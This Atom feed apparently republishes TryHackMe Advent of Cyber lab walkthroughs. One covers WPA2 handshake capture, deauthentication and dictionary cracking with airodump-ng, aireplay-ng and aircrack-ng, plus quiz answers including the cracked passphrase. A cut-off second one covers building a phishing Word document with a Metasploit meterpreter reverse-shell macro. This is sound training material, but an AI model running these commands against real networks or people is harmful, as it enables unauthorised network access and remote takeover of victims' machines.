<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-12T01:31:02-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">THM Advent of Cyber 2024</title><subtitle>a minimalist Jekyll theme for running a blog or publication</subtitle><author><name>Michael</name></author><entry><title type="html">TryHackMe Advent of Cyber - Day 11</title><link href="http://localhost:4000/Day11" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber - Day 11" /><published>2024-12-11T00:00:00-05:00</published><updated>2024-12-11T00:00:00-05:00</updated><id>http://localhost:4000/Day11</id><content type="html" xml:base="http://localhost:4000/Day11"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730305996223.png" alt="Task banner for day 11" /></p>

<p>The much-awaited SOC-mas of Wareville town is just days away! Glitch, the unsung hero, is closing all the doors to Mayor Malware’s malicious intentions one by one. However, there is still much more to do.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730324115409.png" alt="McSkidy Cindy Lou posing with arms crossed." />McSkidy took a thoughtful breath. <em>“Mayor can still find his way in!”</em></p>

<p>Glitch smiles confidently. <em>“I think I know the last technique he relies on to get into the networks.”</em></p>

<p>McSkidy stands up from her chair with a surge of excitement. <em>“Let me guess, it’s a notorious way to get into a network - a Wi-Fi attack?!”</em></p>

<p>Glitch nods decisively. <em>“Exactly! Let’s be one step ahead of the Mayor.”</em></p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Understand what Wi-Fi is</li>
  <li>Explore its importance for an organisation</li>
  <li>Learn the different Wi-Fi attacks</li>
  <li>Learn about the WPA/WPA2 cracking attack</li>
</ul>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730309059191.png" alt="Banner showing connection options provided in this room." /></p>

<p>Begin by pressing the <strong>Start Machine</strong> button below in order to start the virtual machine. The VM will take about <strong>3 minutes</strong> to boot up fully. Then we need to get the AttackBox ready by pressing the <strong>Start AttackBox</strong> button at the top of the page.</p>

<p>You can access the VM from the AttackBox via <strong>SSH</strong> with the following command <code class="language-plaintext highlighter-rouge">ssh glitch@MACHINE_IP</code> and entering the credentials below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM Key Credentials" /></p>

<table>
  <thead>
    <tr>
      <th><strong>Username</strong></th>
      <th>glitch</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Password</strong></td>
      <td>Password321</td>
    </tr>
    <tr>
      <td><strong>IP</strong></td>
      <td>MACHINE_IP</td>
    </tr>
  </tbody>
</table>

<h2 id="what-is-wi-fi">What is Wi-Fi</h2>

<p>The importance of the Internet in our lives is universally acknowledged without the need for any justification. Wi-Fi is the technology that connects our devices to the global network, the Internet. This seamless connection to the Internet appears to be wireless from our devices, which is true to some extent. Our devices are connected wirelessly to the router, which acts as a bridge between us and the Internet, and the router is connected to the Internet via a wired connection.</p>

<p>To connect to Wi-Fi, we turn it on from our devices, and it lists all the available Wi-Fi networks around us. This list comprises the access points (often the routers) that are broadcasting Wi-Fi signals with a unique <strong>SSID</strong> (network name). You can connect to any of these if you know the correct password, also known as a pre-shared key (<strong>PSK</strong>). Once you successfully connect to a network via Wi-Fi, you will be assigned an IP address inside that network, which will uniquely identify you and help you communicate with other devices. It is just like becoming a member of a family assigned with a name that the whole family trusts.</p>

<p>The image below shows an example of what connecting to an <strong>OK443S SSID</strong> requesting a PSK (password) looks like on a typical Windows machine:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730574010264.png" alt="How connecting to an SSID (OK443S) requesting a PSK (password) looks like on a typical Windows machine." /> \n</p>

<p>With all this discussion on Wi-Fi, it seems like a door to our internet access, and every Wi-Fi connection forms a family of devices. Would you allow somebody you don’t really know to become part of your family? Not that easy! Probably because of the privileges a family member has, nobody from outside should ever get those.</p>

<h2 id="wi-fis-pivotal-role-in-organisations---">Wi-Fi’s Pivotal Role in Organisations   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730324115481.png" alt="Byte The Dog character." /></h2>

<p>Most organisations rely on the Internet for their business functioning. Using a wired connection for all employees to connect to the Internet raises concerns about cost, efficiency, and flexibility at work. So, organisations use Wi-Fi for their networks to connect their employees to the Internet. As the employees connect to the organisation’s network, they form a family of interconnected devices. The devices inside the network can communicate with each other and request or respond to any request. Organisations tend to recruit trustworthy and professional employees to avoid any misuse of their privileges inside the network.</p>

<p>However, a malicious actor from outside the organisation could still see the broadcasted Wi-Fi <strong>SSID</strong> of the organisation’s network when they turn their Wi-Fi on. This may not seem to be a problem as the attacker does not know the password, but the attacker actually has some other plans as well!</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-11---Wifi-Animation-1.gif" alt="A disc with a wifi logo being split in two." /></p>

<h2 id="attacks-on-wi-fi">Attacks on Wi-Fi</h2>

<p>There are several techniques attackers use to exploit Wi-Fi technology. The techniques discussed here are solely for educational purposes. Unauthorised attempts to access or compromise networks are illegal and may lead to severe legal consequences. With that in mind, here are some of the most popular techniques:</p>

<ul>
  <li><strong>Evil twin attack:</strong> In this attack, the attacker creates a fake access point that has a similar name to one of your trusted Wi-Fi access points. Of course, it cannot be the exact same. If the trusted Wi-Fi’s name is “Home_Internet”, the attacker creates a fake Wi-Fi access point named “Home_Internnet” or something similar that is difficult to differentiate. The attack starts with the attacker sending de-authentication packets to all the users connected to their legitimate Wi-Fi access points. The users would face repeated disconnections from the network after this. With frustration, the users are likely to open the Wi-Fi access points list for troubleshooting and will find the attacker’s Wi-Fi with almost similar name and with greater signal strength. They would go to connect it, and once connected, the attacker could see all their traffic to or from the Internet.</li>
  <li><strong>Rogue access point:</strong> This attack’s objective is similar to that of the evil twin attack. In this attack, the attacker sets up an open Wi-Fi access point near or inside the organisation’s physical premises to make it available to users with good signal strength. The users inside the organisation may accidentally join this network if their devices are set to connect automatically to open Wi-Fi. The attacker can intercept all their communication after the users connect to this rogue access point.</li>
  <li><strong>WPS attack:</strong> Wi-Fi Protected Setup (WPS) was created to allow users to connect to their Wi-Fi using an 8-digit PIN without remembering complex passwords. However, this 8-digit PIN is vulnerable in some networks due to its insecure configuration. The attack is made by initiating a WPS handshake with the router and capturing the router’s response, which contains some data related to the PIN and is vulnerable to brute-force attacks. Some of the captured data is brute-forced, and the PIN is successfully extracted along with the Pre-Shared Key (PSK).</li>
  <li><strong>WPA/WPA2 cracking:</strong> Wi-Fi Protected Access (WPA) was created to secure wireless communication. It uses a strong encryption algorithm. However, the security of this protocol is heavily influenced by the length and complexity of the Pre-Shared Key (PSK). While cracking WPA, attackers start by sending de-authentication packets to a legitimate user of the Wi-Fi network. Once the user disconnects, they try to reconnect to the network, and a 4-way handshake with the router takes place during this time. Meanwhile, the attacker turns its adaptor into monitor mode and captures the handshake. After the handshake is captured, the attacker can crack the password by using brute-force or dictionary attacks on the captured handshake file.</li>
</ul>

<p>McSkidy looks to Glitch and asks, <em>“What kind of attack are you thinking of demonstrating Glitch?”</em></p>

<p>Glitch paces back and forth before coming to a sudden stop and says, <em>“Today I will be showing you how the WPA/WPA2 cracking attack works!”</em></p>

<h2 id="wpawpa2-cracking">WPA/WPA2 Cracking</h2>

<p>As mentioned above, WPA/WPA2 cracking begins by listening to Wi-Fi traffic to capture the 4-way handshake between a device and the access point. Since waiting for a device to connect or reconnect can take some time, deauthentication packets are sent to disconnect a client, forcing it to reconnect and initiate a new handshake, which is captured. After the handshake is captured, the attacker can crack the password (<strong>PSK</strong>) by using brute-force or dictionary attacks on the captured handshake file.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-11---Wifi-Animation-2.gif" alt="the attacker's network card listening in monitor mode, to capture a handshake between a device and an access point" /></p>

<p><strong>The 4-way Handshake</strong></p>

<p>The WPA password cracking process involves capturing a Wi-Fi network’s handshake to attempt a PSK (password) decryption. First, an attacker places their wireless adapter into monitor mode to scan for networks, then targets a specific network to capture the 4-way handshake. Once the handshake is captured, the attacker runs a brute-force or dictionary attack using a tool like aircrack-ng to attempt to match a wordlist against the passphrase.</p>

<p>The WPA 4-way handshake is a process that helps a client device (like your phone or laptop) and a Wi-Fi router confirm they both have the right “password” or Pre-Shared Key (PSK) before securely connecting. Here’s a simplified rundown of what happens:</p>

<ul>
  <li><strong>Router sends a challenge:</strong> The router (or access point) sends a challenge” to the client, asking it to prove it knows the network’s password without directly sharing it.</li>
  <li><strong>Client responds with encrypted information:</strong> The client takes this challenge and uses the PSK to create an encrypted response that only the router can verify if it also has the correct PSK.</li>
  <li><strong>Router verifies and sends confirmation:</strong> If the router sees the client’s response matches what it expects, it knows the client has the right PSK. The router then sends its own confirmation back to the client.</li>
  <li><strong>Final check and connection established:</strong> The client verifies the router’s response, and if everything matches, they finish setting up the secure connection.</li>
</ul>

<p>This handshake doesn’t directly reveal the PSK itself but involves encrypted exchanges that depend on the PSK.</p>

<p><strong>The Vulnerability</strong></p>

<p>The vulnerability lies in the fact that an attacker can capture this 4-way handshake if they’re listening when a device connects. With the handshake data, they can use it as a basis to attempt offline brute-force or dictionary attacks. Essentially, they try different possible passwords and test each one to see if it would produce the captured handshake data, eventually cracking the PSK if they get a match.</p>

<p>The Practical</p>

<p>On our current SSH session, run the command iw dev. This will show any wireless devices and their configuration that we have available for us to use.
Terminal</p>

<p>glitch@wifi:~$ iw dev
phy#2
Interface wlan2
ifindex 5
wdev 0x200000001
addr 02:00:00:00:02:00
type managed
txpower 20.00 dBm</p>

<p>The device/interface wlan2 is available to us, and there are two important details to take away from this output that will be useful to us:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The addr is the MAC/BSSID of our device. BSSID stands for Basic Service Set Identifier, and it's a unique identifier for a wireless device or access point's physical address.
The type is shown as managed. This is the standard mode used by most Wi-Fi devices (like laptops, phones, etc.) to connect to Wi-Fi networks. In managed mode, the device acts as a client, connecting to an access point to join a network. There is another mode called monitor, which we will discuss shortly.
</code></pre></div></div>

<p>Now, we would like to scan for nearby Wi-Fi networks using our wlan2 device. We can use sudo iw dev wlan2 scan. The dev wlan2 specifies the wireless device you want to work with, and scan tells iw to scan the area for available Wi-Fi networks.
Terminal</p>

<p>glitch@wifi:~$ sudo iw dev wlan2 scan
BSS 02:00:00:00:00:00(on wlan2)
last seen: 520.388s [boottime]
TSF: 1730575383370084 usec (20029d, 19:23:03)
freq: 2437
beacon interval: 100 TUs
capability: ESS Privacy ShortSlotTime (0x0411)
signal: -30.00 dBm
last seen: 0 ms ago
Information elements from Probe Response frame:
SSID: MalwareM_AP
Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0
DS Parameter set: channel 6
ERP: Barker_Preamble_Mode
Extended supported rates: 24.0 36.0 48.0 54.0
RSN:	 * Version: 1
* Group cipher: CCMP
* Pairwise ciphers: CCMP
* Authentication suites: PSK
* Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
Supported operating classes:
* current operating class: 81
Extended capabilities:
* Extended Channel Switching
* Operating Mode Notification</p>

<p>There is a lot of information to dissect here, but here are the most important details that indicate this device is an access point:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The BSSID and SSID of the device are 02:00:00:00:00:00 and MalwareM_AP respectively. Since the SSID is shown, this means the device is advertising a network name, which access points do to allow clients to discover and connect to the network.
The presence of RSN (Robust Security Network) indicates the network is using WPA2, as RSN is a part of the WPA2 standard. WPA2 networks typically use RSN to define the encryption and authentication settings.
The Group and Pairwise ciphers are CCMP. Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP) is the encryption method used by WPA2.
The Authentication suites value inside RSN is PSK indicating that this is a WPA2-Personal network, where a shared password is used for authentication.
Another important detail is the DS Parameter set value, which shows channel 6. The channel, in terms of Wi-Fi, refers to a specific frequency range within the broader Wi-Fi spectrum that allows wireless devices to communicate with each other. There are various Wi-Fi channels, and they all help distribute network traffic across various frequency ranges, which reduces interference. The two most common Wi-Fi channels are 2.4 GHz and 5GHz. In the 2.4 GHz band, channels 1, 6, and 11 are commonly used because they don’t overlap, minimising interference. In the 5 GHz band, there are many more channels available, allowing more networks to coexist without interference.
</code></pre></div></div>

<p>Now will be a good time to discuss another type that we can use on some wireless devices: monitor mode. This is a special mode primarily used for network analysis and security auditing. In this mode, the Wi-Fi interface listens to all wireless traffic on a specific channel, regardless of whether it is directed to the device or not. It passively captures all network traffic within range for analysis without joining a network. We want to check if our wlan2 interface can use monitor mode. To achieve this, we will run the command sudo ip link set dev wlan2 down to turn our device off. Then we will switch modes with sudo iw dev wlan2 set type monitor to change wlan2 to monitor mode. Then turn our device back on with sudo ip link set dev wlan2 up.
Terminal</p>

<p>glitch@wifi:~$ sudo ip link set dev wlan2 down
glitch@wifi:~$ sudo iw dev wlan2 set type monitor
glitch@wifi:~$ sudo ip link set dev wlan2 up</p>

<p>We can confirm that our interface is in monitor mode with the command sudo iw dev wlan2 info.
Terminal</p>

<p>glitch@wifi:~$ sudo iw dev wlan2 info
Interface wlan2
ifindex 5
wdev 0x200000001
addr 02:00:00:00:02:00
type monitor
wiphy 2
channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
txpower 20.00 dBm</p>

<p>Now, let us create one more SSH session. We want to have 2 separate terminals in order to see clearly how the attack works. You can align the SSH terminals however you like, but here is an example of how it should look like.</p>

<p>2 terminals with SSH sessions in the AttackBox.</p>

<p>On the first terminal, we start by capturing Wi-Fi traffic in the area, specifically targeting the WPA handshake packets. We can do this with the command sudo airodump-ng wlan2. This command provides a list of nearby Wi-Fi networks (SSIDs) and shows important details like signal strength, channel, and encryption type. This information is already known to us from our previous commands.</p>

<p>Note: By default, airodump-ng will automatically switch the selected wireless interface into monitor mode if the interface supports it.
Terminal</p>

<p>glitch@wifi:~$ sudo airodump-ng wlan2
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>

<p>02:00:00:00:00:00  -28        2        0    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>

<p>The output reveals the information we already knew before, such as the BSSID, SSID, and the channel. However, in this particular output, we are also given the channel where our target SSID is listening (channel 6). Now, we will focus on the MalwareM_AP access point and capture the WPA handshake; this is crucial for the PSK (password) cracking process.</p>

<p>First, in the current terminal, let us cancel airodump-ng using CTRL+C and then execute the command sudo airodump-ng -c 6 –bssid 02:00:00:00:00:00 -w output-file wlan2. This command targets the specific network channel and MAC address (BSSID) of the access point for which you want to capture the traffic and saves the information to a few files that start with the name output-file. These files will be used to crack the PSK. The ultimate goal of this command is to capture the 4-way handshake. It will first check for any clients that may be connected to the access point. If a client is already connected, then we can perform a deauthentication attack; otherwise, for any new client that connects, we will capture the 4-way handshake. In this particular scenario, a client is already connected. The output will look the same at first until we receive the information about the connected client, which will be displayed at the bottom of our output. It is important to leave this command running until we are done with the attack.
Terminal</p>

<p>glitch@wifi:~$ sudo airodump-ng -c 6 –bssid 02:00:00:00:00:00 -w output-file wlan2
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>

<p>02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>

<p>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</p>

<p>It should take between 1 to 5 minutes before receiving the client information. In our case, it will show like this:
Terminal</p>

<p>BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>

<p>02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>

<p>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</p>

<p>02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140</p>

<p>Note that the STATION section shows the device’s BSSID (MAC) of 02:00:00:00:01:00 that is connected to the access point. This is the connection that we will be attacking. Now we are ready for the next step.</p>

<p>On the second terminal, we will launch the deauthentication attack. Because the client is already connected, we want to force them to reconnect to the access point, forcing it to send the handshake packets. We can break this down into 3 simple steps:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Deauthentication packets: The tool aireplay-ng sends deauthentication packets to either a specific client (targeted attack) or to all clients connected to an access point (broadcast attack). These packets are essentially "disconnect" commands that force the client to drop its current Wi-Fi connection.
Forcing a reconnection: When the client is disconnected, it automatically tries to reconnect to the Wi-Fi network. During this reconnection, the client and access point perform the 4-way handshake as part of the reauthentication process.
Capturing the handshake: This is where airodump-ng comes into play because it will capture this handshake as it happens, providing the data needed to attempt the WPA/WPA2 cracking.
</code></pre></div></div>

<p>We can do this with sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2. The -0 flag indicates that we are using the deauthentication attack, and the 1 value is the number of deauths to send. The -a indicates the BSSID of the access point and -c indicates the BSSID of the client to deauthenticate.
Terminal</p>

<p>glitch@wifi:~$ sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
19:29:37  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
19:29:38  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]</p>

<p>Now, if we look back on our first terminal, we will see the WPA handshake shown on the top-right of our output as WPA handshake: 02:00:00:00:00:00. All of this information is being saved into our output files.
Terminal</p>

<p>CH  6 ][ Elapsed: 1 min ][ 2024-11-02 19:30 ][ WPA handshake: 02:00:00:00:00:00</p>

<p>BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>

<p>02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>

<p>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</p>

<p>02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140  EAPOL</p>

<p>In the second terminal, we can use the captured WPA handshake to attempt to crack the WPA/WP2 passphrase. We will be performing a dictionary attack in order to match the passphrase against each entry in a specified wordlist file. A shortened version of the infamous rockyou.txt wordlist has already been provided for us to use. This is located in the /home/glitch/ directory. If the passphrase is weak and appears in the wordlist, it will eventually be cracked. The command sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap will do this for us where the -a 2 flag indicates the WPA/WPA2 attack mode. The -b indicates the BSSID of the access point, and the -w flag indicates the dictionary list to use for the attack. Finally, we select the output files that we will be using, which contain the 4-way handshake that we will be cracking.
Terminal</p>

<p>glitch@wifi:~$ sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
Reading packets, please wait…
Opening output-file-01.cap
Read 276 packets.
1 potential targets</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                           Aircrack-ng 1.6

  [00:00:01] 304/513 keys tested (217.04 k/s)

  Time left: 0 seconds                                      59.26%

             KEY FOUND! [ REDACTED ]


  Master Key     : B6 53 9A 71 8C C4 74 5F E3 26 49 82 37 74 65 09
                   BE C5 62 CE 43 C4 68 A7 B4 8F 8C E6 98 EE 1C CB

  Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

  EAPOL HMAC     : C8 8E D5 F4 B4 5A 1D C4 6C 41 35 07 68 81 79 CD
</code></pre></div></div>

<p>Note: If you get an Packets contained no EAPOL data; unable to process this AP error, this means that you ran aircrack-ng prior to the handshake being captured or that the handshake was not captured at all. If that’s the case, then re-do all of the steps in order to capture the WPA handshake.</p>

<p>With the PSK, we can now join the MalwareM_AP access point. In a typical engagement, we would do this to inspect the new network, or in some cases, joining the access point is enough to show impact. First, press CTRL+C on the terminal that has airodump-ng running in order to stop the airodump-ng process. We do this because we will not be able to join the Wi-Fi network while airodump-ng is running due to the fact that we are actively using the interface in monitor mode. Then execute the following commands:
Terminal</p>

<p>glitch@wifi:~$ wpa_passphrase MalwareM_AP ‘ENTER PSK HERE’ &gt; config
glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2</p>

<p>Note: If you get a rfkill: Cannot get wiphy information error, you can ignore it. You will also notice that wpa_supplicant has automatically switched our wlan2 interface to managed mode.</p>

<p>Giving it about 10 seconds and checking the wireless interfaces once again with iw dev shows that we have joined the MalwareM_AP SSID.</p>

<p>Terminal</p>

<p><code class="language-plaintext highlighter-rouge">glitch@wifi:~$ iw dev phy#2 -- Removed for brevity --</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Interface wlan2
	ifindex 5
	wdev 0x200000001
	addr 02:00:00:00:02:00
	ssid MalwareM_AP
	type managed
	channel 6 (2437 MHz), width: 20 MHz (no HT), center1: 2437 MHz
	txpower 20.00 dBm
</code></pre></div></div>

<p>The End</p>

<p>McSkidy looked in awe as Glitch flawlessly exposed a weakness in the Wi-Fi network.</p>

<p>Glitch ponders and says, <em>“That password is pretty weak, I must say. I wouldn’t have been surprised if the Mayor had already found a way.”</em></p>

<p>McSkidy gets to work right away while Glitch thinks about what is next.</p>

<p>Glitch stops and says, <em>“I am ever curious if the Mayor knows much about race conditions and how will that affect us?”</em></p>

<p>Answer the questions below</p>

<p>What is the BSSID of our wireless interface?</p>

<p>02:00:00:00:02:00</p>

<p>What is the SSID and BSSID of the access point? Format: SSID, BSSID</p>

<p>MalwareM_AP, 02:00:00:00:00:00</p>

<p>What is the BSSID of the wireless interface that is already connected to the access point?</p>

<p>02:00:00:00:01:00</p>

<p>What is the PSK after performing the WPA cracking attack?</p>

<p>fluffy/champ24</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/networking">Networking</a> module.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day11Header.png" /><media:content medium="image" url="http://localhost:4000/Day11Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber - Day 10</title><link href="http://localhost:4000/Day10" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber - Day 10" /><published>2024-12-10T00:00:00-05:00</published><updated>2024-12-10T00:00:00-05:00</updated><id>http://localhost:4000/Day10</id><content type="html" xml:base="http://localhost:4000/Day10"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376026704.svg" alt="Task banner for day DAY 10" /></p>

<p>Click here to watch the walkthrough video!</p>

<p><em>Mayor Malware had one, just one SOC-mas wish:</em></p>

<p><em>The SOC organiser would fall for his phish!</em></p>

<p><em>Well on top of this, he wanted as well,</em></p>

<p><em>Once the email opened, to gain a rev shell.</em></p>

<p>\n</p>

<p>Mayor Malware attempts to phish one of the SOC-mas organizers by sending a document embedded with a malicious macro. Once opened, the macro will execute, giving the Mayor remote access to the organizer’s system.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376786068.svg" alt="Mayor Malware attempts to phish one of the SOC-mas organizers." /> \n</p>

<p>Marta May Ware is surprised that her system was compromised even after following tight security, but McSkidy thinks she traced the attacker, and he got in. It’s none other than Mayor Malware who got into the system. This time, the Mayor used phishing to get his victim. McSkidy’s quick incident response prevented significant damage.</p>

<p>In this task, you will run a security assessment against Marta May Ware. The purpose would be to improve her security and raise her cyber security awareness against future attacks.</p>

<p>Glitch is still concerned about any future attack on Marta May Ware and advises McSkidy to run a phishing exercise on her to verify whether she is vigilant about these attacks.</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Understand how phishing attacks work</li>
  <li>Discover how macros in documents can be used and abused</li>
  <li>Learn how to carry out a phishing attack with a macro</li>
</ul>

<h2 id="phishingattacks">Phishing Attacks</h2>

<p>Security is as strong as the weakest link. Many would argue that humans are the weakest link in the security chain. Is it easier to exploit a patched system behind a firewall or to convince a user to open an “important” document? Hence, “human hacking” is usually the easiest to accomplish and falls under social engineering.</p>

<p>Phishing is a play on the word fishing; however, the attacker is not after seafood. Phishing works by sending a “bait” to a usually large group of target users. Furthermore, the attacker often craft their messages with a sense of urgency, prompting target users to take immediate action without thinking critically, increasing the chances of success. The purpose is to steal personal information or install malware, usually by convincing the target user to fill out a form, open a file, or click a link.</p>

<p>One might get an email out of nowhere claiming that they are being charged a hefty sum and that they should check the details in the attached file or URL. The attacker just needs to have their target users open the malicious file or view the malicious link. This can trigger specific actions that would give the attack control over your system.</p>

<h2 id="macros">Macros</h2>

<p>The needs of MS Office users can be vastly different, and there is no way that a default installation would cater to all of these needs. In particular, some users find themselves repeating the same tasks, such as formatting and inserting text or performing calculations. Consider the example of number-to-words conversion where a number such as “1337” needs to be expressed as “one thousand three hundred thirty-seven”. It would take hours to finish if you have hundreds of numbers to convert. Hence, there is a need for an automated solution to save time and reduce manual effort.</p>

<p>In computing, a macro refers to a set of programmed instructions designed to automate repetitive tasks. MS Word, among other MS Office products, supports adding macros to documents. In many cases, these macros can be a tremendous time-saving feature. However, in cyber security, these automated programs can be hijacked for malicious purposes.</p>

<p>To add a macro to an MS Word document for instance, we click on the <strong>View</strong> menu and then select <strong>Macros</strong> as pointed out by 1 and 2 in the screenshot below. We should specify the name of the macro and specify that we want to save it in our current document, as indicated by 3 and 4. Finally, we press the <strong>Create</strong> button.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859866900.png" alt="Adding a macro to an MS Word document" /> \n</p>

<p>Let’s explore one way the attacker could have created an MS Word document with an embedded macro to gain access to Marta’s system.</p>

<h2 id="attack-plan">Attack Plan</h2>

<p>In his plans, Mayor Malware needs to create a document with a malicious macro. Upon opening the document, the macro will execute a payload and connect to the Mayor’s machine, giving him remote control. Consequently, the Mayor needs to ensure that he is listening for incoming connections on his machine before emailing the malicious document to Marta May Ware. By executing the macro, the Mayor gains remote access to Marta’s system through a reverse shell, allowing him to execute commands and control her machine remotely. The steps are as follows:</p>

<ol>
  <li>Create a document with a malicious macro</li>
  <li>Start listening for incoming connections on the attacker’s system</li>
  <li>Email the document and wait for the target user to open it</li>
  <li>The target user opens the document and connects to the attacker’s system</li>
  <li>Control the target user’s system</li>
</ol>

<p>You might wonder why you don’t set the malicious macro so that you can connect to the target system directly instead of the other way around. The reason is that when the target system is behind a firewall or has a private IP address, you cannot reach it and, hence, cannot connect to it.</p>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below: \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376755339.png" alt="We need to start the AttackBox and the attached VM" /> \n</p>

<p>Press the <strong>Start Machine</strong> button below to prepare the mail server.</p>

<p>Start Machine</p>

<p>Click on the <strong>Start AttackBox</strong> button at the top of the page to follow along with creating this document. The AttackBox machine will start in Split-Screen view. If it is not visible, use the blue <strong>Show Split View</strong> button at the top of the page.</p>

<h2 id="attackers-system">Attacker’s System</h2>

<p>On the AttackBox, you need to carry out two steps:</p>

<ul>
  <li>Create a document with an embedded malicious macro</li>
  <li>Listen for incoming connections</li>
</ul>

<h2 id="creating-the-malicious-document">Creating the Malicious Document</h2>

<p>The first step would be to embed a malicious macro within the document. Alternatively, you can use the Metasploit Framework to create such a document, as this would spare us the need for a system with MS Office.</p>

<p>You will use the Metasploit Framework to create the document with the malicious macro. This requires the following commands:</p>

<ul>
  <li>Open a new terminal window and run <code class="language-plaintext highlighter-rouge">msfconsole</code> to start the Metasploit Framework</li>
  <li><code class="language-plaintext highlighter-rouge">set payload windows/meterpreter/reverse_tcp</code>specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell \n</li>
  <li><code class="language-plaintext highlighter-rouge">use exploit/multi/fileformat/office_word_macro</code> specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro</li>
  <li><code class="language-plaintext highlighter-rouge">set LHOST CONNECTION_IP</code> specifies the IP address of the attacker’s system, <code class="language-plaintext highlighter-rouge">CONNECTION_IP</code> in this case is the IP of the AttackBox</li>
  <li><code class="language-plaintext highlighter-rouge">set LPORT 8888</code> specifies the port number you are going to listen on for incoming connections on the AttackBox</li>
  <li><code class="language-plaintext highlighter-rouge">show options</code> shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example</li>
  <li><code class="language-plaintext highlighter-rouge">exploit</code> generates a macro and embeds it in a document</li>
